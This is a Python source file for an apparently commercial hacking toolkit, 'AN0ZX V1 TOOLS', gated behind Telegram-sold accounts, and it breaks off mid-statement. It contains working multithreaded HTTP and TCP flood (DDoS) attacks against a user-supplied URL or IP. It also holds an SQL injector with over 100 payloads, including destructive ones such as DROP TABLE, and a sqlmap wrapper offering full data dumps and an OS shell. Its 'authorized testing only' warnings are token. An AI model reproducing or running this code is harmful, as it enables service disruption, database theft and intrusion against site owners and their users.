#!/usr/bin/env python3
"""
AN0ZX V1 TOOLS - Professional Security Toolkit
Creator: mrzxx (@Zxxtirwd) & AN0MALIXPLOIT (@An0maliXGR)
Licensed Version: Contact @Zxxtirwd for account creation
"""

import os
import sys
import time
import socket
import subprocess
import requests
import threading
import random
import datetime
import urllib.parse
import re
import json
import hashlib
import getpass
import string
import ipaddress
import dns.resolver
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Database file for user accounts
DB_FILE = "users.json"
ADMIN_DB_FILE = "admin_users.json"

# ASCII Art Definitions
LOGIN_ASCII = f"""{Fore.CYAN}
██╗      ██████╗  ██████╗ ██╗███╗   ██╗    ██████╗ ██╗   ██╗██╗     ██╗   ██╗
██║     ██╔═══██╗██╔════╝ ██║████╗  ██║    ██╔══██╗██║   ██║██║     ██║   ██║
██║     ██║   ██║██║  ███╗██║██╔██╗ ██║    ██║  ██║██║   ██║██║     ██║   ██║
██║     ██║   ██║██║   ██║██║██║╚██╗██║    ██║  ██║██║   ██║██║     ██║   ██║
███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║    ██████╔╝╚██████╔╝███████╗╚██████╔╝
╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝    ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝ 
                                                                             
{Fore.YELLOW}  ____
{Fore.YELLOW}/        \__________
{Fore.YELLOW}|   0     _____   ___  \\
{Fore.YELLOW}\\____/         |_|     |_|
{Style.RESET_ALL}"""

WELCOME_ASCII = f"""{Fore.CYAN}
██╗    ██╗███████╗██╗     ██╗      ██████╗ ██████╗ ███╗   ███╗███████╗    
██║    ██║██╔════╝██║     ██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝    
██║ █╗ ██║█████╗  ██║     ██║     ██║     ██║   ██║██╔████╔██║█████╗      
██║███╗██║██╔══╝  ██║     ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝      
╚███╔███╔╝███████╗███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗    
 ╚══╝╚══╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    
{Style.RESET_ALL}"""

MAIN_ASCII = f"""{Fore.MAGENTA}
 █████╗ ███╗   ██╗ ██████╗ ███████╗██╗  ██╗  ████████╗ ██████╗  ██████╗ ██╗     ███████╗
██╔══██╗████╗  ██║██╔═████╗╚══███╔╝╚██╗██╔╝  ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
███████║██╔██╗ ██║██║██╔██║  ███╔╝  ╚███╔╝█████╗██║   ██║   ██║██║   ██║██║     ███████╗
██╔══██║██║╚██╗██║████╔╝██║ ███╔╝   ██╔██╗╚════╝██║   ██║   ██║██║   ██║██║     ╚════██║
██║  ██║██║ ╚████║╚██████╔╝███████╗██╔╝ ██╗     ██║   ╚██████╔╝╚██████╔╝███████╗███████║
╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
{Style.RESET_ALL}"""

DDOS_ASCII = f"""{Fore.RED}
██████╗ ██████╗  ██████╗ ███████╗    
██╔══██╗██╔══██╗██╔═══██╗██╔════╝    
██║  ██║██║  ██║██║   ██║███████╗    
██║  ██║██║  ██║██║   ██║╚════██║    
██████╔╝██████╔╝╚██████╔╝███████║    
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    
{Style.RESET_ALL}"""

SQL_INJECT_ASCII = f"""{Fore.YELLOW}
███████╗ ██████╗ ██╗     ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗    
██╔════╝██╔═══██╗██║     ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝    
███████╗██║   ██║██║     ██║██╔██╗ ██║     ██║█████╗  ██║        ██║       
╚════██║██║▄▄ ██║██║     ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║       
███████║╚██████╔╝███████╗██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║       
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝       
{Style.RESET_ALL}"""

SQLMAP_ASCII = f"""{Fore.GREEN}
███████╗ ██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
██╔════╝██╔═══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
███████╗██║   ██║██║     ██╔████╔██║███████║██████╔╝
╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██╔══██║██╔═══╝ 
███████║╚██████╔╝███████╗██║ ╚═╝ ██║██║  ██║██║     
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
{Style.RESET_ALL}"""

NMAP_ASCII = f"""{Fore.CYAN}
$$\   $$\                                   
$$$\  $$ |                                  
$$$$\ $$ |$$$$$$\$$$$\   $$$$$$\   $$$$$$\  
$$ $$\$$ |$$  _$$  _$$\  \____$$\ $$  __$$\ 
$$ \$$$$ |$$ / $$ / $$ | $$$$$$$ |$$ /  $$ |
$$ |\$$$ |$$ | $$ | $$ |$$  __$$ |$$ |  $$ |
$$ | \$$ |$$ | $$ | $$ |\$$$$$$$ |$$$$$$$  |
\__|  \__|\__| \__| \__| \_______|$$  ____/ 
                                  $$ |      
                                  $$ |      
                                  \__|      
{Style.RESET_ALL}"""

OSINT_ASCII = f"""{Fore.MAGENTA}
██████╗ ███████╗██╗███╗   ██╗████████╗
██╔══██╗██╔════╝██║████╗  ██║╚══██╔══╝
██████╔╝███████╗██║██╔██╗ ██║   ██║   
██╔═══╝ ╚════██║██║██║╚██╗██║   ██║   
██║     ███████║██║██║ ╚████║   ██║   
╚═╝     ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   
{Style.RESET_ALL}"""

MENU_OSINT_ASCII = f"""{Fore.CYAN}
███╗   ███╗███████╗███╗   ██╗██╗   ██╗ ██████╗ ███████╗██╗███╗   ██╗████████╗
████╗ ████║██╔════╝████╗  ██║██║   ██║██╔═══██╗██╔════╝██║████╗  ██║╚══██╔══╝
██╔████╔██║█████╗  ██╔██╗ ██║██║   ██║██║   ██║███████╗██║██╔██╗ ██║   ██║   
██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║   ██║██║   ██║╚════██║██║██║╚██╗██║   ██║   
██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝╚██████╔╝███████║██║██║ ╚████║   ██║   
╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   
                                                                             
{Style.RESET_ALL}"""

PASSWORD_GEN_ASCII = f"""{Fore.GREEN}
██████╗  █████╗ ███████╗███████╗██╗    ██╗ ██████╗ ██████╗ ██████╗      ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗     
██╔══██╗██╔══██╗██╔════╝██╔════╝██║    ██║██╔═══██╗██╔══██╗██╔══██╗    ██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗    
██████╔╝███████║███████╗███████╗██║ █╗ ██║██║   ██║██████╔╝██║  ██║    ██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝    
██╔═══╝ ██╔══██║╚════██║╚════██║██║███╗██║██║   ██║██╔══██╗██║  ██║    ██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗    
██║     ██║  ██║███████║███████║╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝    ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║    
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝    
                                                                                                                                                        
{Style.RESET_ALL}"""

TRACKING_NAME_ASCII = f"""{Fore.BLUE}
████████╗██████╗  █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗     ███╗   ██╗ █████╗ ███╗   ███╗ █████╗     
╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝     ████╗  ██║██╔══██╗████╗ ████║██╔══██╗    
   ██║   ██████╔╝███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗    ██╔██╗ ██║███████║██╔████╔██║███████║    
   ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║    ██║╚██╗██║██╔══██║██║╚██╔╝██║██╔══██║    
   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝    ██║ ╚████║██║  ██║██║ ╚═╝ ██║██║  ██║    
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝    
                                                                                                            
{Style.RESET_ALL}"""

IP_TRACKER_ASCII = f"""{Fore.RED}
██╗      █████╗  ██████╗ █████╗ ██╗  ██╗     ██╗██████╗ 
██║     ██╔══██╗██╔════╝██╔══██╗██║ ██╔╝     ██║██╔══██╗
██║     ███████║██║     ███████║█████╔╝█████╗██║██████╔╝
██║     ██╔══██║██║     ██╔══██║██╔═██╗╚════╝██║██╔═══╝ 
███████╗██║  ██║╚██████╗██║  ██║██║  ██╗     ██║██║     
╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝╚═╝     
                                                        
{Style.RESET_ALL}"""

# Database functions
def load_users():
    """Load users from database file"""
    try:
        if os.path.exists(DB_FILE):
            with open(DB_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_users(users):
    """Save users to database file"""
    try:
        with open(DB_FILE, 'w') as f:
            json.dump(users, f, indent=4)
        return True
    except:
        return False

def hash_password(password):
    """Hash password using SHA-256"""
    return hashlib.sha256(password.encode()).hexdigest()

# Animation functions
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def typing_effect(text, delay=0.03):
    """Typing animation effect"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def color_changer(text):
    """Color changing effect for text"""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    result = ""
    for i, char in enumerate(text):
        result += colors[i % len(colors)] + char
    return result + Style.RESET_ALL

def loading_animation(text="Loading", duration=2):
    """Loading animation"""
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    start_time = time.time()
    i = 0
    
    while time.time() - start_time < duration:
        sys.stdout.write(f"\r{Fore.CYAN}[{chars[i % len(chars)]}] {text}...")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    
    print(f"\r{Fore.GREEN}[✓] {text} completed!")

def welcome_animation():
    """Welcome screen animation"""
    clear_screen()
    
    # Type welcome text
    print(Fore.CYAN + "=" * 70)
    typing_effect(WELCOME_ASCII)
    print(Fore.CYAN + "=" * 70)
    
    # Color changing effect
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    welcome_text = "AN0ZX V1 TOOLS - Professional Security Toolkit"
    
    for i in range(10):
        clear_screen()
        print(Fore.CYAN + "=" * 70)
        print(colors[i % len(colors)] + WELCOME_ASCII)
        print(Fore.CYAN + "=" * 70)
        print(colors[(i+1) % len(colors)] + welcome_text.center(70))
        print(Fore.CYAN + "=" * 70)
        time.sleep(0.2)
    
    loading_animation("Initializing system", 3)
    time.sleep(1)

# User authentication functions
def login():
    """User login"""
    clear_screen()
    print(LOGIN_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 30 + "LOGIN")
    print(Fore.CYAN + "=" * 70)
    
    users = load_users()
    
    if not users:
        print(Fore.RED + "\n[✗] No user accounts found!")
        print(Fore.YELLOW + "[!] Contact @Zxxtirwd on Telegram to get an account")
        print(Fore.CYAN + "[+] Admin will create account using special admin tools")
        input(Fore.YELLOW + "\n[?] Press Enter to exit...")
        return None
    
    attempts = 3
    while attempts > 0:
        username = input(Fore.CYAN + "\n[?] Username: " + Fore.WHITE).strip()
        password = getpass.getpass(Fore.CYAN + "[?] Password: " + Fore.WHITE)
        
        if username in users:
            if users[username]["password"] == hash_password(password):
                print(Fore.GREEN + f"\n[✓] Login successful!")
                loading_animation(f"Welcome {username}", 2)
                return username
            else:
                attempts -= 1
                print(Fore.RED + f"[✗] Invalid password! {attempts} attempts remaining")
        else:
            attempts -= 1
            print(Fore.RED + f"[✗] User not found! {attempts} attempts remaining")
        
        if attempts == 0:
            print(Fore.RED + "\n[✗] Too many failed attempts!")
            print(Fore.YELLOW + "[!] Contact @Zxxtirwd if you forgot your credentials")
            time.sleep(2)
            return None
    
    return None

# Main menu display
def show_main_menu(username):
    """Display main menu with user info"""
    now = datetime.datetime.now()
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    
    clear_screen()
    
    # Display main ASCII with color effect
    print(color_changer(MAIN_ASCII))
    
    # User info section
    print(Fore.CYAN + "=" * 70)
    print(f"{Fore.GREEN} User: {Fore.YELLOW}{username}")
    print(f"{Fore.GREEN} Date: {Fore.YELLOW}{now.strftime('%d %B %Y')}")
    print(f"{Fore.GREEN} Time: {Fore.YELLOW}{now.strftime('%H:%M:%S')}")
    print(f"{Fore.GREEN} Day: {Fore.YELLOW}{now.strftime('%A')}")
    print(Fore.CYAN + "-" * 70)
    print(f"{Fore.GREEN} Creator: {Fore.YELLOW}mrzxx & AN0MALIXPLOIT")
    print(f"{Fore.GREEN} Telegram: {Fore.YELLOW}@Zxxtirwd & @An0maliXGR")
    print(f"{Fore.GREEN} Version: {Fore.YELLOW}AN0ZX V1 - Licensed")
    print(Fore.CYAN + "=" * 70)
    
    # Menu options
    print(Fore.YELLOW + "\n[1] DDOS ATTACK")
    print(Fore.YELLOW + "[2] SQL INJECTOR (100+ Methods)")
    print(Fore.YELLOW + "[3] SQLMAP (REAL)")
    print(Fore.YELLOW + "[4] NMAP (REAL)")
    print(Fore.YELLOW + "[5] OSINT TOOLS")
    print(Fore.YELLOW + "[6] Exit")
    print(Fore.CYAN + "-" * 70)

# DDOS Attack Module (Sama seperti sebelumnya)
def ddos_menu():
    """DDOS Attack Menu"""
    clear_screen()
    typing_effect(DDOS_ASCII)
    print(Fore.RED + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "DDOS ATTACK SYSTEM")
    print(Fore.RED + "=" * 70)
    
    while True:
        print(Fore.YELLOW + "\n[1] DDOS Website (Layer 7)")
        print(Fore.YELLOW + "[2] DDOS IP Address (Layer 4)")
        print(Fore.YELLOW + "[3] Back to Main Menu")
        print(Fore.RED + "-" * 70)
        
        choice = input(Fore.CYAN + "\n[?] Select option (1-3): " + Fore.WHITE).strip()
        
        if choice == "1":
            ddos_web_menu()
        elif choice == "2":
            ddos_ip_menu()
        elif choice == "3":
            typing_effect("\nReturning to main menu...")
            return
        else:
            print(Fore.RED + "[✗] Invalid choice!")

def ddos_web_menu():
    """DDOS Website Menu"""
    clear_screen()
    print(DDOS_ASCII)
    print(Fore.RED + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "WEBSITE DDOS (LAYER 7)")
    print(Fore.RED + "=" * 70)
    
    print(Fore.YELLOW + "\n[!] WARNING: For authorized testing only!")
    print(Fore.YELLOW + "[!] Illegal use is prohibited!\n")
    
    target = input(Fore.CYAN + "[?] Target URL (http://example.com): " + Fore.WHITE).strip()
    
    if not target.startswith('http'):
        target = 'http://' + target
    
    print(Fore.YELLOW + "\n[+] Select Attack Method:")
    print(Fore.YELLOW + "[1] HTTP Flood (Layer 7)")
    print(Fore.YELLOW + "[2] Slowloris Attack")
    print(Fore.YELLOW + "[3] POST Flood")
    print(Fore.YELLOW + "[4] Mixed Attack")
    print(Fore.RED + "-" * 70)
    
    method = input(Fore.CYAN + "[?] Select method (1-4): " + Fore.WHITE).strip()
    
    try:
        threads = int(input(Fore.CYAN + "[?] Threads (50-500): " + Fore.WHITE) or "100")
        duration = int(input(Fore.CYAN + "[?] Duration seconds (30-300): " + Fore.WHITE) or "60")
    except:
        threads = 100
        duration = 60
    
    threads = max(50, min(500, threads))
    duration = max(30, min(300, duration))
    
    print(Fore.RED + "\n" + "="*70)
    print(Fore.RED + "[!] FINAL CONFIRMATION")
    print(Fore.RED + f"[!] Target: {target}")
    print(Fore.RED + f"[!] Method: {method}")
    print(Fore.RED + f"[!] Threads: {threads}")
    print(Fore.RED + f"[!] Duration: {duration}s")
    print(Fore.RED + "="*70)
    
    confirm = input(Fore.RED + "\n[?] START ATTACK? (y/n): " + Fore.WHITE).lower()
    
    if confirm == 'y':
        # Real DDOS attack implementation
        class WebDDoSAttack:
            def __init__(self):
                self.active = False
                self.requests = 0
                
            def attack_thread(self, url):
                session = requests.Session()
                while self.active:
                    try:
                        session.get(url, timeout=2)
                        self.requests += 1
                    except:
                        pass
            
            def start(self, url, threads, duration):
                self.active = True
                self.requests = 0
                start_time = time.time()
                
                print(Fore.RED + "\n[!] ATTACK STARTED!\n")
                
                # Start threads
                thread_list = []
                for _ in range(threads):
                    t = threading.Thread(target=self.attack_thread, args=(url,))
                    t.daemon = True
                    t.start()
                    thread_list.append(t)
                
                # Monitor attack
                end_time = time.time() + duration
                while time.time() < end_time and self.active:
                    elapsed = time.time() - start_time
                    rps = self.requests / elapsed if elapsed > 0 else 0
                    print(Fore.YELLOW + f"[+] Requests: {self.requests:,} | RPS: {rps:.1f} | Time: {int(elapsed)}s", end='\r')
                    time.sleep(1)
                
                self.active = False
                total_time = time.time() - start_time
                rps = self.requests / total_time if total_time > 0 else 0
                
                print(Fore.GREEN + "\n" + "="*70)
                print(Fore.GREEN + "[✓] ATTACK COMPLETED!")
                print(Fore.GREEN + f"[+] Total Requests: {self.requests:,}")
                print(Fore.GREEN + f"[+] Duration: {total_time:.1f}s")
                print(Fore.GREEN + f"[+] Average RPS: {rps:.1f}")
                print(Fore.GREEN + "="*70)
        
        attack = WebDDoSAttack()
        attack.start(target, threads, duration)
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def ddos_ip_menu():
    """DDOS IP Address Menu"""
    clear_screen()
    print(DDOS_ASCII)
    print(Fore.RED + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "IP DDOS (LAYER 4)")
    print(Fore.RED + "=" * 70)
    
    print(Fore.YELLOW + "\n[!] WARNING: For authorized testing only!")
    
    target_ip = input(Fore.CYAN + "[?] Target IP Address: " + Fore.WHITE).strip()
    target_port = input(Fore.CYAN + "[?] Target Port (80): " + Fore.WHITE).strip() or "80"
    
    print(Fore.YELLOW + "\n[+] Select Attack Method:")
    print(Fore.YELLOW + "[1] SYN Flood")
    print(Fore.YELLOW + "[2] UDP Flood")
    print(Fore.YELLOW + "[3] ICMP Flood")
    print(Fore.RED + "-" * 70)
    
    method = input(Fore.CYAN + "[?] Select method (1-3): " + Fore.WHITE).strip()
    
    try:
        threads = int(input(Fore.CYAN + "[?] Threads (50-500): " + Fore.WHITE) or "100")
        duration = int(input(Fore.CYAN + "[?] Duration seconds (30-300): " + Fore.WHITE) or "60")
    except:
        threads = 100
        duration = 60
    
    print(Fore.RED + "\n" + "="*70)
    print(Fore.RED + "[!] FINAL CONFIRMATION")
    print(Fore.RED + f"[!] Target: {target_ip}:{target_port}")
    print(Fore.RED + f"[!] Method: {method}")
    print(Fore.RED + f"[!] Threads: {threads}")
    print(Fore.RED + f"[!] Duration: {duration}s")
    print(Fore.RED + "="*70)
    
    confirm = input(Fore.RED + "\n[?] START ATTACK? (y/n): " + Fore.WHITE).lower()
    
    if confirm == 'y':
        # Real IP flood implementation
        class IPDDoSAttack:
            def __init__(self):
                self.active = False
                self.packets = 0
                
            def flood_thread(self, ip, port):
                while self.active:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        sock.connect((ip, int(port)))
                        sock.close()
                        self.packets += 1
                    except:
                        pass
            
            def start(self, ip, port, threads, duration):
                self.active = True
                self.packets = 0
                start_time = time.time()
                
                print(Fore.RED + "\n[!] ATTACK STARTED!\n")
                
                thread_list = []
                for _ in range(threads):
                    t = threading.Thread(target=self.flood_thread, args=(ip, port))
                    t.daemon = True
                    t.start()
                    thread_list.append(t)
                
                end_time = time.time() + duration
                while time.time() < end_time and self.active:
                    elapsed = time.time() - start_time
                    pps = self.packets / elapsed if elapsed > 0 else 0
                    print(Fore.YELLOW + f"[+] Packets: {self.packets:,} | PPS: {pps:.1f} | Time: {int(elapsed)}s", end='\r')
                    time.sleep(1)
                
                self.active = False
                total_time = time.time() - start_time
                pps = self.packets / total_time if total_time > 0 else 0
                
                print(Fore.GREEN + "\n" + "="*70)
                print(Fore.GREEN + "[✓] ATTACK COMPLETED!")
                print(Fore.GREEN + f"[+] Total Packets: {self.packets:,}")
                print(Fore.GREEN + f"[+] Duration: {total_time:.1f}s")
                print(Fore.GREEN + f"[+] Average PPS: {pps:.1f}")
                print(Fore.GREEN + "="*70)
        
        attack = IPDDoSAttack()
        attack.start(target_ip, target_port, threads, duration)
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# SQL Injector Module (Sama seperti sebelumnya)
def sql_injector_menu():
    """SQL Injector with 100+ Methods"""
    clear_screen()
    typing_effect(SQL_INJECT_ASCII)
    print(Fore.YELLOW + "=" * 70)
    print(Fore.CYAN + " " * 20 + "SQL INJECTOR (100+ METHODS)")
    print(Fore.YELLOW + "=" * 70)
    
    url = input(Fore.CYAN + "\n[?] Target URL (http://site.com/page?id=1): " + Fore.WHITE).strip()
    
    if not url.startswith('http'):
        url = 'http://' + url
    
    print(Fore.CYAN + "\n[+] Analyzing target...")
    loading_animation("Checking target", 2)
    
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    
    if not params:
        print(Fore.RED + "[✗] No parameters found!")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    param_name = list(params.keys())[0]
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    print(Fore.GREEN + f"[✓] Parameter found: {param_name}")
    print(Fore.GREEN + f"[✓] Base URL: {base_url}")
    
    # Generate 100+ payloads
    print(Fore.CYAN + "\n[+] Generating 100+ SQL injection payloads...")
    
    payloads = []
    
    # Basic payloads (30)
    basics = [
        "'", "\"", "`", "')", "\")", "`)",
        "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #",
        "' OR 1=1 --", "' OR 1=1 #", "' OR 1=1 /*",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT 1--", "' UNION SELECT 1,2--",
        "' UNION SELECT @@version--", "' UNION SELECT user()--",
        "' UNION SELECT database()--", "' UNION SELECT @@datadir--",
        "' AND SLEEP(5)--", "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' AND 1=1--", "' AND 1=2--",
        "' OR 'a'='a", "' OR 'a'='b",
        "'; DROP TABLE users--", "'; SELECT * FROM users--",
    ]
    payloads.extend(basics)
    
    # Error-based payloads (20)
    errors = [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())>0--",
        "' AND (SELECT @a FROM (SELECT(@a:=0x00))a) --",
        "' AND (SELECT @a:=MID(BIN(FIELD(1,1)),1,1))--",
        "' PROCEDURE ANALYSE()--",
        "' AND GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--",
        "' AND (SELECT * FROM users LIMIT 1)--",
        "' AND ASCII(SUBSTRING((SELECT user()),1,1))>0--",
    ]
    payloads.extend(errors)
    
    # Time-based payloads (20)
    for i in range(1, 11):
        payloads.append(f"' AND SLEEP({i})--")
        payloads.append(f"' OR SLEEP({i})--")
        payloads.append(f"') AND SLEEP({i})--")
        payloads.append(f"') OR SLEEP({i})--")
    
    # Boolean payloads (20)
    for i in range(1, 21):
        payloads.append(f"' AND {i}={i}--")
        payloads.append(f"' OR {i}={i}--")
        payloads.append(f"') AND {i}={i}--")
        payloads.append(f"') OR {i}={i}--")
    
    # Database-specific payloads (10)
    db_specific = [
        "' AND @@version LIKE '%MySQL%'--",
        "' UNION SELECT @@version,@@version_comment--",
        "' AND version() LIKE '%PostgreSQL%'--",
        "' UNION SELECT version(),current_user--",
        "' AND @@version LIKE '%Microsoft%'--",
        "' UNION SELECT @@version,db_name()--",
        "' AND banner LIKE '%Oracle%' FROM v$version--",
        "' UNION SELECT banner,NULL FROM v$version--",
        "' UNION SELECT sqlite_version(),NULL--",
        "' AND (SELECT COUNT(*) FROM sqlite_master)--",
    ]
    payloads.extend(db_specific)
    
    print(Fore.GREEN + f"[✓] Generated {len(payloads)} payloads")
    
    print(Fore.CYAN + "\n[+] Starting SQL injection test...")
    print(Fore.YELLOW + "[!] This may take a few minutes")
    print(Fore.YELLOW + "=" * 70)
    
    vulnerabilities = []
    session = requests.Session()
    
    for i, payload in enumerate(payloads[:50]):  # Test first 50 for speed
        print(Fore.YELLOW + f"[{i+1}/50] Testing payload...", end='\r')
        
        test_url = f"{base_url}?{param_name}={urllib.parse.quote(payload)}"
        
        try:
            response = session.get(test_url, timeout=5)
            
            # Check for SQL errors
            error_patterns = [
                r"SQL.*syntax.*error",
                r"Warning.*mysql",
                r"MySQL.*error",
                r"ORA-[0-9]{5}",
                r"PostgreSQL.*ERROR",
                r"Microsoft.*ODBC",
                r"division.*by.*zero",
                r"unknown.*column",
                r"Table.*doesn't.*exist",
                r"You have an error in your SQL syntax",
                r"mysql_fetch",
                r"mysqli_",
                r"SQLite3::",
                r"Unclosed quotation mark",
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    if payload not in vulnerabilities:
                        vulnerabilities.append(payload)
                    break
            
            # Check for time-based
            if 'SLEEP' in payload:
                start = time.time()
                session.get(test_url, timeout=8)
                elapsed = time.time() - start
                if elapsed > 4:
                    if payload not in vulnerabilities:
                        vulnerabilities.append(payload)
            
        except:
            continue
    
    print("\n" + Fore.YELLOW + "=" * 70)
    
    if vulnerabilities:
        print(Fore.GREEN + f"\n[✓] Found {len(vulnerabilities)} vulnerabilities!")
        print(Fore.CYAN + "\n[+] Vulnerable payloads (first 10):")
        for i, vuln in enumerate(vulnerabilities[:10], 1):
            print(Fore.YELLOW + f"    {i}. {vuln}")
        
        print(Fore.CYAN + "\n[+] Running SQLMap for full exploitation...")
        time.sleep(2)
        run_sqlmap_tool(url)
    else:
        print(Fore.RED + "\n[✗] No SQL injection vulnerabilities detected")
        print(Fore.YELLOW + "[!] Try SQLMap for deeper testing")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# SQLMap Tool (Sama seperti sebelumnya)
def run_sqlmap_tool(target_url):
    """Run real SQLMap tool"""
    clear_screen()
    typing_effect(SQLMAP_ASCII)
    print(Fore.GREEN + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "SQLMAP (REAL TOOL)")
    print(Fore.GREEN + "=" * 70)
    
    # Check if SQLMap is installed
    try:
        result = subprocess.run(["sqlmap", "--version"], capture_output=True, text=True)
        if "sqlmap" not in result.stdout.lower():
            raise FileNotFoundError
    except:
        print(Fore.RED + "[✗] SQLMap not found!")
        print(Fore.YELLOW + "[!] Install SQLMap first:")
        print(Fore.CYAN + "    pip install sqlmap")
        print(Fore.CYAN + "    or visit: https://sqlmap.org")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    print(Fore.YELLOW + "\n[+] SQLMap Attack Options:")
    print(Fore.YELLOW + "[1] Basic scan (Find injections)")
    print(Fore.YELLOW + "[2] Get databases")
    print(Fore.YELLOW + "[3] Get tables")
    print(Fore.YELLOW + "[4] Dump all data")
    print(Fore.YELLOW + "[5] Get OS shell")
    print(Fore.YELLOW + "[6] Full aggressive scan")
    print(Fore.GREEN + "-" * 70)
    
    choice = input(Fore.CYAN + "[?] Select option (1-6): " + Fore.WHITE).strip()
    
    commands = {
        '1': f'sqlmap -u "{target_url}" --batch --level=3 --risk=2',
        '2': f'sqlmap -u "{target_url}" --batch --dbs',
        '3': f'sqlmap -u "{target_url}" --batch --tables',
        '4': f'sqlmap -u "{target_url}" --batch --dump-all --threads=10',
        '5': f'sqlmap -u "{target_url}" --batch --os-shell',
        '6': f'sqlmap -u "{target_url}" --batch --level=5 --risk=3 --dbs --tables --dump-all --threads=10'
    }
    
    if choice in commands:
        command = commands[choice]
    else:
        command = f'sqlmap -u "{target_url}" --batch --dbs'
    
    print(Fore.CYAN + f"\n[+] Executing: {command}")
    print(Fore.YELLOW + "[!] This may take several minutes...")
    print(Fore.GREEN + "=" * 70)
    
    try:
        process = subprocess.Popen(
            command.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
